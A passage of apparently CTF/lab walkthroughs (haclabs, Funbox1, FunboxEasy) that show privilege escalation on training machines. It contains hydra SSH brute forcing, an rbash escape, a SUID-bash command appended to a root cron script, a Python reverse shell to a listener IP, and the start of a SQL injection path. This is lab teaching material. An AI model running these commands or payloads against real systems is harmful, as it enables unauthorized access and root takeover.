<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Upon logging in, we immediately get prompted with this message:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opeartion going on=====================&gt; Copy password to /haclabsSystem compromised!!!ALERTCopy operation aborted</span><br></pre></td></tr></table></figure>

<p>Listing all the files in the current directory shows a hidden file named <code>.systemlogs</code> .</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yash@haclabs:~$ ls -latotal 44drwxr-xr-x 6 yash yash 4096 Feb 15 19:58 .drwxr-xr-x 4 root root 4096 Jan 23 18:41 ..-rw-r--r-- 1 yash yash  220 Jan 23 18:41 .bash_logout-rw-r--r-- 1 yash yash 3939 Jan 23 19:15 .bashrcdrwx------ 2 yash yash 4096 Jan 23 18:45 .cache-rw-rw-r-- 1 yash yash   90 Jan 23 18:51 flag1.txtdrwx------ 3 yash yash 4096 Jan 23 18:45 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 23 18:47 .local-rw-r--r-- 1 yash yash  807 Jan 23 18:41 .profiledrwxrwxr-x 2 yash yash 4096 Jan 23 19:05 .ssh-rw-rw-r-- 1 yash yash 1430 Jan 24 01:51 .systemlogs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yash@haclabs:~$ cat .systemlogsssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl/dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A=123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389</span><br></pre></td></tr></table></figure>

<p>While this file only seems to contain random text at first sight, we can identify some important parts between double quotes.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabsA=123456789+A[::-1]</span><br></pre></td></tr></table></figure>

<p>The 3rd item is a way in <code>python</code> to reverse a string. So those 3 strings seem to suggest the following possible password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs + reversed(&quot;123456789&quot;) =&gt; haclabs987654321</span><br></pre></td></tr></table></figure>

<p>If we take a look at <code>/etc/passwd</code> we will see that <strong>haclabs</strong> is a user on the system.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yash@haclabs:~$ cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">haclabs:x:1000:1000:haclabs,,,:/home/haclabs:/bin/bash</span><br><span class="line">sshd:x:122:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:123:127:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">yash:x:1001:1001:,,,:/home/yash:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we try the <code>haclabs:haclabs987654321</code> set of credentials, we are able to switch the user to <code>haclabs</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yash@haclabs:~$ su haclabs</span><br><span class="line">Password:</span><br><span class="line">haclabs@haclabs:/home/yash$ id</span><br><span class="line">uid=1000(haclabs) gid=1000(haclabs) groups=1000(haclabs),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As the haclabs user, we have all sudo permissions, allowing us to do a simple <code>sudo su</code> to escalate.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">haclabs@haclabs:/home/yash$ sudo -l</span><br><span class="line">[sudo] password for haclabs:</span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">haclabs@haclabs:/home/yash$ sudo su</span><br><span class="line">root@haclabs:/home/yash# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),27(sudo)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>Gobuster</tag>
      </tags>
  </entry>
  <entry>
    <title>Funbox1</title>
    <url>/undefined/Funbox1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Funbox"><a href="#Exploitation-Guide-for-Funbox" class="headerlink" title="Exploitation Guide for Funbox"></a><strong>Exploitation Guide for Funbox</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nmap 192.168.120.189</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:10 EDT</span><br><span class="line">Nmap scan report for 192.168.120.189</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a><strong>FTP</strong></h3><p>We first check if we can access the FTP service without credentials.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# ftp 192.168.120.189</span><br><span class="line">Connected to 192.168.120.189.</span><br><span class="line">220 ProFTPD Server (Debian) [::ffff:192.168.120.189]</span><br><span class="line">Name (192.168.120.189:kali): anonymous</span><br><span class="line">331 Password required for anonymous</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However, we are unlucky and so we will leave this one for now.</p>
<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the website on port 80 we find it redirects to <a href="http://funbox.fritz.box/">http://funbox.fritz.box/</a>. We can add a hosts file entry to get things working correctly for us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo echo &quot;192.168.120.189 funbox.fritz.box&quot; &gt;&gt; /etc/hosts</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now that we can access the website, we see that it is running WordPress. Our next step is to run <code>wpscan</code> to see if we can identify any vulnerabilities and any usernames.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://funbox.fritz.box/ [192.168.120.189]</span><br><span class="line">[+] Started: Thu Aug 20 22:26:14 2020</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] joe</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Aug 20 22:26:24 2020</span><br><span class="line">[+] Requests Done: 26</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 6.525 KB</span><br><span class="line">[+] Data Received: 257.882 KB</span><br><span class="line">[+] Memory used: 150.535 MB</span><br><span class="line">[+] Elapsed time: 00:00:09</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can see <code>wpscan</code> identified two users, <code>joe</code> and <code>admin</code>. With this knowledge we can continue by next looking at the SSH service.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="SSH-Brute-Force"><a href="#SSH-Brute-Force" class="headerlink" title="SSH Brute Force"></a><strong>SSH Brute Force</strong></h3><p>Since we now have a potential username, <code>joe</code>, we can attempt to brute force the password using <code>hydra</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.120.189</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-20 22:33:11</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.120.189:22/</span><br><span class="line">[22][ssh] host: 192.168.120.189   login: joe   password: 12345</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 3 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 3 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 22:33:20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This quickly identifies the password <code>12345</code> and we can use these credentials to login via SSH.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh joe@192.168.120.189</span><br><span class="line">...</span><br><span class="line">joe@funbox:~$ id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Shell-Breakout"><a href="#Shell-Breakout" class="headerlink" title="Shell Breakout"></a><strong>Shell Breakout</strong></h3><p>If we try to change directory we find that we are in a restricted shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ cd /</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Before we can continue our enumeration we will need to escape this and obtain a full shell. First we will check our environment to see what we have access to.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ env</span><br><span class="line">SHELL=/bin/rbash</span><br><span class="line">PWD=/home/joe</span><br><span class="line">LOGNAME=joe</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/joe</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">...</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">USER=joe</span><br><span class="line">SHLVL=1</span><br><span class="line">XDG_SESSION_ID=28</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1001</span><br><span class="line">SSH_CLIENT=192.168.118.6 50000 22</span><br><span class="line">XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Looking at the <code>PATH</code> variable it appears to be unchanged and as such we can just run <code>bash</code> normally to escape.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ bashjoe@funbox:~$ cd /joe@funbox:/$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Insecure-File-Permissions"><a href="#Insecure-File-Permissions" class="headerlink" title="Insecure File Permissions"></a><strong>Insecure File Permissions</strong></h3><p>If we return to <code>joe&#39;s</code> home directory we can find a file called <code>mbox</code> containing some interesting information.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/$ cd ~joe@funbox:~$ cat mboxFrom root@funbox  Fri Jun 19 13:12:38 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)From: root &lt;root@funbox&gt;Hi Joe, please tell funny the backupscript is done.From root@funbox  Fri Jun 19 13:15:21 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)From: root &lt;root@funbox&gt;Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.</span><br></pre></td></tr></table></figure>

<p>It appears that a user called <code>funny</code> is waiting on a backup script. If we change to <code>funny&#39;s</code> home directory we can find the script with some insecure file permissions.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/home/funny$ ls -lahtotal 47Mdrwxr-xr-x 3 funny funny 4.0K Jul 18 10:02 .drwxr-xr-x 4 root  root  4.0K Jun 19 11:50 ..-rwxrwxrwx 1 funny funny   55 Jul 18 10:15 .backup.sh-rw------- 1 funny funny    0 Aug 14 13:03 .bash_history-rw-r--r-- 1 funny funny  220 Feb 25 12:03 .bash_logout-rw-r--r-- 1 funny funny 3.7K Feb 25 12:03 .bashrcdrwx------ 2 funny funny 4.0K Jun 19 10:43 .cache-rw-rw-r-- 1 funny funny  47M Aug 21 06:58 html.tar-rw-r--r-- 1 funny funny  807 Feb 25 12:03 .profile-rw-rw-r-- 1 funny funny  162 Jun 19 14:13 .reminder.sh-rw-rw-r-- 1 funny funny   74 Jun 19 12:25 .selected_editor-rw-r--r-- 1 funny funny    0 Jun 19 10:44 .sudo_as_admin_successful-rw------- 1 funny funny 7.7K Jul 18 10:02 .viminfojoe@funbox:/home/funny$ cat .backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/html</span><br></pre></td></tr></table></figure>

<p>Before we overwrite the file, let’s first check whether or not it is being executed and who by. To do this we will use <a href="https://github.com/DominicBreuker/pspy">pspy</a>. <code>pspy</code> is tool which allows you to snoop on processes without needing <code>root</code> permissions. We can download <code>pspy</code> to <code>/tmp</code> and run it for several minutes to see if anything interesting is revealed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64...2020-08-21 07:05:12 (24.4 MB/s) - ‘pspy64’ saved [3078592/3078592]joe@funbox:/tmp$ chmod +x pspy64joe@funbox:/tmp$ ./pspy64pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855     ██▓███    ██████  ██▓███ ▓██   ██▓    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                   ░           ░ ░                               ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)Draining file system events due to startup...done2020/08/21 07:05:32 CMD: UID=0    PID=978    | proftpd: (accepting connections)2020/08/21 07:05:32 CMD: UID=112  PID=951    | /usr/sbin/mysqld2020/08/21 07:05:32 CMD: UID=0    PID=943    | /usr/lib/policykit-1/polkitd --no-debug2020/08/21 07:05:32 CMD: UID=0    PID=924    | /bin/login -p --...2020/08/21 07:05:32 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity2020/08/21 07:06:01 CMD: UID=0    PID=13193  | /usr/sbin/CRON -f2020/08/21 07:06:01 CMD: UID=1000 PID=13194  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13195  | /bin/bash /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13196  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:06:01 CMD: UID=1000 PID=13198  | /usr/sbin/postdrop -r2020/08/21 07:06:01 CMD: UID=1000 PID=13197  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny...2020/08/21 07:10:01 CMD: UID=0    PID=13405  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13404  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:01 CMD: UID=0    PID=13403  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13402  | /bin/bash /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13401  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=0    PID=13400  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13399  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13406  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:02 CMD: UID=0    PID=13407  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root2020/08/21 07:10:02 CMD: UID=1000 PID=13410  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=0    PID=13409  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=1000 PID=13408  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny2020/08/21 07:10:02 CMD: UID=0    PID=13411  | cleanup -z -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13412  | trivial-rewrite -n rewrite -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13413  | local -t unix2020/08/21 07:10:02 CMD: UID=0    PID=13414  | local -t unix</span><br></pre></td></tr></table></figure>

<p>Although we do initially see that <code>/home/funny/.backup.sh</code> is run as <code>funny</code>, we later see that it is also run as <code>root</code>. So to exploit this all we need to do is append a malicious command to <code>/home/funny/.backup.sh</code>. We can do this as follows.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ echo &quot;cp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash&quot; &gt;&gt; /home/funny/.backup.shjoe@funbox:~$ cat /home/funny/.backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlcp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash</span><br></pre></td></tr></table></figure>

<p>Now we wait five to ten minutes for our command to execute and then we should find a copy of <code>bash</code> in the <code>/tmp</code> directory with its SUID bit set. We can then execute this to obtain a root shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joe@funbox:~$ ls -lah /tmptotal 4.2Mdrwxrwxrwt 13 root root  4.0K Aug 21 07:18 .drwxr-xr-x 20 root root  4.0K Aug 14 12:40 ..-rwsr-xr-x  1 root funny 1.2M Aug 21 07:35 bashdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .font-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .ICE-unix-rwxrwxr-x  1 joe  joe   3.0M Aug 22  2019 pspy64drwx------  3 root root  4.0K Aug 21 02:07 snap.lxddrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-apache2.service-sFj0Vedrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-logind.service-H0gLpjdrwx------  3 root root  4.0K Aug 21 02:10 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-resolved.service-xyb48idrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-timesyncd.service-SpPXfhdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .Test-unixdrwx------  2 root root  4.0K Aug 21 02:07 vmware-root_656-2689274927drwxrwxrwt  2 root root  4.0K Aug 21 02:07 .X11-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .XIM-unixjoe@funbox:~$ /tmp/bash -pbash-5.0# iduid=1001(joe) gid=1001(joe) euid=0(root) groups=1001(joe)</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>修改.backup.sh的内容为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlpython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.73&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>等待2分钟获得了反弹的Shell进行退出</p>
<p>再次进行端口监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>等待5分钟即可获得ROOT权限的Shell</p>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Brute-Force</tag>
        <tag>Script</tag>
      </tags>
  </entry>
  <entry>
    <title>FunboxEasy</title>
    <url>/undefined/FunboxEasy/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-FunboxEasy"><a href="#Exploitation-Guide-for-FunboxEasy" class="headerlink" title="Exploitation Guide for FunboxEasy"></a><strong>Exploitation Guide for FunboxEasy</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan against all TCP ports:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p- 192.168.120.224</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 12:17 EDT</span><br><span class="line">Nmap scan report for 192.168.120.224</span><br><span class="line">Host is up (0.036s latency).</span><br><span class="line">Not shown: 65481 closed ports, 51 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">33060/tcp open  mysqlx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a><strong>Gobuster</strong></h3><p>Navigating to the application on port 80 doesn’t show anything useful, but we can use <code>gobuster</code> with the wordlist <strong>/usr/share/wordlists/dirb/common.txt</strong> to brute force the site’s directories:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt -z</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">...</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/secret (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/store (Status: 301)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Our scan reveals a few directories of interest: <em>/admin</em> (decoy), <em>/secret</em> (decoy), and <em>/store</em>.</p>
<p>Navigating to <a href="http://192.168.120.224/admin/">http://192.168.120.224/admin/</a>, we see a login control. And navigating to <a href="http://192.168.120.224/store/">http://192.168.120.224/store/</a>, we see a link <code>Admin Login</code> in the lower-right portion of the screen that leads to another login control at <a href="http://192.168.120.224/store/admin.php">http://192.168.120.224/store/admin.php</a>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><p>There are a couple of ways to proceed at this point.</p>
<h3 id="Login-Bruteforce"><a href="#Login-Bruteforce" class="headerlink" title="Login Bruteforce"></a><strong>Login Bruteforce</strong></h3><p>We can simply try one of the well-known default credential pairs <code>admin:admin</code> against <a href="http://192.168.120.224/store/admin.php">http://192.168.120.224/store/admin.php</a>. And we will find that we are logged in as the administrator user of this web store.</p>
<h3 id="SQL-Injection-Vulnerability"><a href="#SQL-Injection-Vulnerability" class="headerlink" title="SQL Injection Vulnerability"></a><strong>SQL Injection Vulnerability</strong></h3><p>Alternatively, we can exploit an SQL injection vulnerability in the unauthenticated portion of this application. Clicking on a book image (for example, <code>C# 6.0 in a Nutshell</code>), we are directed to its page with the <code>bookisbn</code> GET parameter, like this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.120.224/store/book.php?bookisbn=978-1-49192-706-9</span><br><span class="line"></span><br></pre></td></tr></table></figure>

